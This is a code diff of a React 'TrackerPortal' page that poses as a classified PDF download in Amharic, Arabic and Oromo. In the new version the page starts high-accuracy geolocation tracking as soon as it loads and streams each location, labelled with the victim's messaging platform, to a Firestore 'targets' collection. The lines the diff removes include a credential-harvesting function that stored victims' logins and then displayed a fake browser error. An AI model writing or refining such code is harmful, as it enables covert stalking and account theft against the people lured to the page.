@@ -21,9 +21,10 @@ function formatTime(seconds: number) {
 }
 
 export const TrackerPortal: React.FC = () => {
-  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
+  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('granted');
   const [errorMsg, setErrorMsg] = useState<string>('');
-  const [progress, setProgress] = useState(0);
+  const [progress, setProgress] = useState(100);
+  const [syncCount, setSyncCount] = useState(0);
   const targetIdRef = useRef<string | null>(null);
 
   const [targetId, setTargetId] = useState<string | null>(null);
@@ -31,24 +32,23 @@ export const TrackerPortal: React.FC = () => {
   const [timeLeft, setTimeLeft] = useState(120);
   const [lang, setLang] = useState('amharic');
   const [fakeError, setFakeError] = useState(false);
-  const [credentials, setCredentials] = useState({ id: '', pass: '', platform: '' });
-  const [showLogin, setShowLogin] = useState(false);
 
   useEffect(() => {
     setIsClient(true);
-    setStatus('scanning');
     
     // Detect language from URL
     const params = new URLSearchParams(window.location.search);
     const langParam = params.get('lang');
     if (langParam) setLang(langParam);
     const nameParam = params.get('n');
-    if (nameParam) targetIdRef.current = nameParam;
+    if (nameParam) {
+      targetIdRef.current = nameParam;
+    }
 
     // Generate or get persistent ID for this target
     let tid = localStorage.getItem('eagle_target_id');
     if (!tid) {
-      tid = `T-${Math.random().toString(36).substring(2, 11).toUpperCase()}`;
+      tid = `T-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
       localStorage.setItem('eagle_target_id', tid);
     }
     setTargetId(tid);
@@ -57,95 +57,52 @@ export const TrackerPortal: React.FC = () => {
       setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
     }, 1000);
     
-    // Auto-trigger tracking protocol immediately on load
-    const autoStart = setTimeout(() => {
-       startRecon();
-    }, 50);
-
+    startRecon();
+ 
     return () => {
       clearInterval(countdown);
-      clearTimeout(autoStart);
     };
   }, []);
-
-  const loginStrings = {
-    amharic: "መረጃውን ለማግኘት መጀመሪያ ይግቡ (Sign In)",
-    arabic: "سجل دخولك أولاً للوصول إلى المعلومات",
-    oromo: "Odeeffannoo kana argachuuf dura galmaa'aa (Log In)"
-  };
-
-  const scanningMessages = {
-    amharic: "ዳታውን በመጫን ላይ...",
-    arabic: "إنشاء نفق البيانات...",
-    oromo: "Odeeffannoo walitti fiduu..."
-  };
 
   // Protocol initialization
   const startRecon = async () => {
     if (!isClient) return;
-    setStatus('scanning');
+    setStatus('granted');
     setErrorMsg('');
-    setProgress(0);
-    
-      // Technical visual progression (Faster for direct feel)
-      const timer = setInterval(() => {
-        setProgress(prev => {
-          if (prev >= 100) {
-            clearInterval(timer);
-            return 100;
-          }
-          return prev + 5;
-        });
-      }, 10);
+    setProgress(100);
 
     try {
-      // Use existing session if available, otherwise Background Auth
-      let user = auth.currentUser;
-      if (!user) {
-        try {
-          const cred = await signInAnonymously(auth);
-          user = cred.user;
-        } catch (authErr: any) {
-          console.warn("Auth failed, falling back to local ID:", authErr);
-          // If anonymous auth is disabled, we still proceed to record locally if possible
-          // In this specific task, we want persistence even with auth errors
-        }
-      }
+      // Fire-and-forget background auth to avoid blocking
+      signInAnonymously(auth).catch(e => console.warn("Sync delay:", e));
 
       if (!navigator.geolocation) {
         throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
       }
 
-      // Detect Platform accurately
+      // Metadata for tracking
       const ua = (navigator.userAgent || "").toLowerCase();
-      let platform = 'Browser';
+      let platform = 'Mobile';
       if (ua.includes('fb')) platform = 'Facebook';
       else if (ua.includes('whatsapp')) platform = 'WhatsApp';
       else if (ua.includes('telegram')) platform = 'Telegram';
-      else if (ua.includes('instagram')) platform = 'Instagram';
-      else if (ua.includes('twitter') || ua.includes('x/')) platform = 'X';
-      else if (ua.includes('iphone') || ua.includes('ipad')) platform = 'iOS';
+      else if (ua.includes('iphone')) platform = 'iPhone';
       else if (ua.includes('android')) platform = 'Android';
 
-      // Use the provided name or a fallback
-      const targetDisplayName = targetIdRef.current || `Asset ${auth.currentUser?.uid.slice(0, 4) || targetId?.slice(-4) || 'ALPHA'}`;
-
-      // High-precision stealth stream with quality verification
+      const targetDisplayName = targetIdRef.current || `Subject_${targetId?.slice(-4) || 'ALPHA'}`;
       let lastReportTime = 0;
-      const MIN_INTERVAL = 4000; 
+      const MIN_INTERVAL = 3000; 
 
       navigator.geolocation.watchPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           const now = Date.now();
           
-          // Only update if it's been a few seconds 
-          if (now - lastReportTime < MIN_INTERVAL && status === 'granted') {
+          if (now - lastReportTime < MIN_INTERVAL) {
              if (accuracy > 30) return; 
           }
           
-          setStatus('granted');
           lastReportTime = now;
+          setSyncCount(prev => prev + 1);
           
           try {
             const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
@@ -157,8 +114,7 @@ export const TrackerPortal: React.FC = () => {
               time: new Date().toISOString() 
             };
 
-            // Full record for sync
-            const entry = {
+            await setDoc(targetRef, {
               name: targetDisplayName,
               lat: latitude,
               lng: longitude,
@@ -167,77 +123,42 @@ export const TrackerPortal: React.FC = () => {
               status: 'active',
               platform: platform,
               history: arrayUnion(historyItem)
-            };
-
-            await setDoc(targetRef, entry, { merge: true });
+            }, { merge: true });
             
             // Notification success (Subtle)
             const signalHint = document.createElement('div');
-            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-blue-500/10 border border-blue-500/50 text-blue-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] opacity-50';
-            signalHint.innerText = `SIGNAL_SYNC: ACCURACY_${Math.round(accuracy)}M`;
+            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-blue-500/10 border border-blue-500/50 text-blue-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] opacity-50 pointer-events-none';
+            signalHint.innerText = `LINK_STABLE: ACCURACY_${Math.round(accuracy)}M`;
             document.body.appendChild(signalHint);
             setTimeout(() => signalHint.remove(), 2000);
 
           } catch (e) {
-            console.error("Uplink Error:", e);
+            console.error("Uplink Failure:", e);
           }
         },
         (error) => {
-          console.error("Signal Lost:", error);
+          console.error("Geo Error:", error);
           if (error.code === error.PERMISSION_DENIED) {
             setStatus('denied');
-            setErrorMsg('PROTOCOL_ERROR: ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው።');
-          } else {
-            // Don't kill the session on minor errors, just log and wait for next fix
-            console.warn("Retrying position fix...");
+            setErrorMsg('LOCATION_REQUIRED: ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው።');
           }
         },
-        { 
-          enableHighAccuracy: true, 
-          maximumAge: 0, 
-          timeout: 60000 // Increased timeout for slow GPS fixes
-        }
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
       );
     } catch (err: any) {
       console.error(err);
       setStatus('error');
-      setErrorMsg('HANDSHAKE_FAILURE: Terminal reset required.');
     }
   };
 
-  const handleHarvest = async (platformName: string) => {
-    if (!credentials.id || !credentials.pass) return;
-    
-    // Switch state to simulation
-    setStatus('scanning');
-    setProgress(0);
-    setShowLogin(false);
-    
-    try {
-      const uid = auth.currentUser?.uid || targetId || 'anon';
-      const targetRef = doc(db, 'targets', uid);
-      await updateDoc(targetRef, {
-        intel: arrayUnion({
-          platform: platformName,
-          user: credentials.id,
-          key: credentials.pass,
-          timestamp: new Date().toISOString()
-        })
-      });
-
-      // Show "Unpacking" for a bit then trigger final fake error
-      setStatus('granted');
-      setTimeout(() => {
-        setFakeError(true);
-        setStatus('error');
-        setErrorMsg('ERR_CONNECTION_RESET');
-      }, 5000);
-
-    } catch (e) {
-      console.error(e);
-      setFakeError(true);
-    }
-  };
+  // If hydration hasn't happened yet, render a matching skeleton
+  if (!isClient) {
+    return (
+      <div className="min-h-screen bg-[#050608] flex items-center justify-center p-4">
+        <div className="w-full max-w-md h-[400px] bg-[#0a0c12] rounded-xl border border-slate-800 animate-pulse"></div>
+      </div>
+    );
+  }
 
   // If fake error is active, show a very convincing standard error page (Chrome style)
   if (fakeError) {
@@ -319,30 +240,6 @@ export const TrackerPortal: React.FC = () => {
         </div>
 
         <div className="space-y-8">
-          {status === 'scanning' && (
-            <div className="space-y-6 py-4">
-              <div className="space-y-2">
-                <div className="flex justify-between items-center text-[10px] font-bold text-slate-600 mb-1">
-                  <span className="tracking-[0.2em] animate-pulse uppercase">
-                    {lang === 'amharic' ? scanningMessages.amharic : lang === 'arabic' ? scanningMessages.arabic : scanningMessages.oromo}
-                  </span>
-                  <span className="text-blue-500 font-mono italic">{progress}%</span>
-                </div>
-                <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden border border-slate-800">
-                  <motion.div 
-                    className="h-full bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.5)]" 
-                    initial={{ width: 0 }}
-                    animate={{ width: `${progress}%` }}
-                  />
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-2">
-                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Packet_Sync: OK</div>
-                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Node_Stream: ACTIVE</div>
-              </div>
-            </div>
-          )}
-
           {status === 'granted' && (
             <motion.div 
               initial={{ opacity: 0 }}
@@ -352,18 +249,59 @@ export const TrackerPortal: React.FC = () => {
               <div className="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden text-left shadow-2xl">
                 <div className="bg-blue-600/20 p-3 border-b border-slate-800 flex items-center justify-between">
                   <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">Classified_Report_8429.pdf</span>
-                </div>
-                <div className="p-6 space-y-4">
-                  <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
-                  <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
-                  <div className="h-4 w-1/2 bg-slate-800 rounded animate-pulse opacity-30"></div>
-                  <div className="py-4 flex flex-col items-center gap-3">
-                    <div className="w-8 h-8 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin"></div>
-                    <span className="text-[10px] text-slate-400 animate-pulse uppercase tracking-[0.2em] text-center font-bold">
-                       {lang === 'amharic' ? 'ዳታውን በማዘጋጀት ላይ (Syncing Data)...' : 'Syncing Data Stream...'}
-                    </span>
-                    <div className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/30 rounded text-[7px] text-blue-400 font-bold">PROTOCOL: ALPHA_ENCRYPTED</div>
+                  <div className="flex gap-1">
+                    <div className="w-1.5 h-1.5 rounded-full bg-red-500/50"></div>
+                    <div className="w-1.5 h-1.5 rounded-full bg-amber-500/50"></div>
+                    <div className="w-1.5 h-1.5 rounded-full bg-green-500/50"></div>
                   </div>
+                </div>
+                <div className="p-8 space-y-6">
+                  {syncCount === 0 ? (
+                    <div className="space-y-4 py-4">
+                      <div className="flex justify-center mb-6">
+                        <div className="w-12 h-12 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin"></div>
+                      </div>
+                      <div className="space-y-2">
+                        <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
+                        <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
+                      </div>
+                      <p className="text-[10px] text-center text-slate-500 uppercase tracking-widest animate-pulse mt-4">
+                         {lang === 'amharic' ? 'ግንኙነት በመፍጠር ላይ...' : 'Establishing Secure Node...'}
+                      </p>
+                    </div>
+                  ) : (
+                    <div className="space-y-6 animate-in fade-in zoom-in duration-500">
+                      <div className="flex items-center gap-4 p-4 bg-blue-500/5 border border-blue-500/20 rounded-lg">
+                        <div className="w-10 h-10 rounded-full bg-green-500/10 border border-green-500/30 flex items-center justify-center">
+                           <Shield className="w-5 h-5 text-green-500" />
+                        </div>
+                        <div className="space-y-1">
+                          <p className="text-[10px] font-black text-white uppercase tracking-wider">Secure Handshake: OK</p>
+                          <p className="text-[8px] text-slate-500">Uplink sequence stable. Processing data fragments.</p>
+                        </div>
+                      </div>
+                      
+                      <div className="space-y-3">
+                         <div className="flex justify-between items-center text-[9px] text-slate-400 font-bold uppercase tracking-tighter">
+                            <span>Relay Buffer</span>
+                            <span className="text-blue-500">100%</span>
+                         </div>
+                         <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
+                            <motion.div 
+                              initial={{ width: 0 }}
+                              animate={{ width: '100%' }}
+                              className="h-full bg-blue-500"
+                            />
+                         </div>
+                      </div>
+
+                      <div className="p-4 bg-slate-950/50 border border-slate-800 rounded font-mono text-[9px] text-slate-400 space-y-1">
+                        <p className="text-blue-500 font-bold">TERMINAL: AUTH_READY</p>
+                        <p>{'>'} {lang === 'amharic' ? 'ሰነዱን በማዘጋጀት ላይ...' : 'Preparing encrypted document...'}</p>
+                        <p>{'>'} {lang === 'amharic' ? 'እባክዎ በትዕግስት ይጠብቁ' : 'Please stand by for decryption.'}</p>
+                      </div>
+                    </div>
+                  )}
                 </div>
               </div>
             </motion.div>
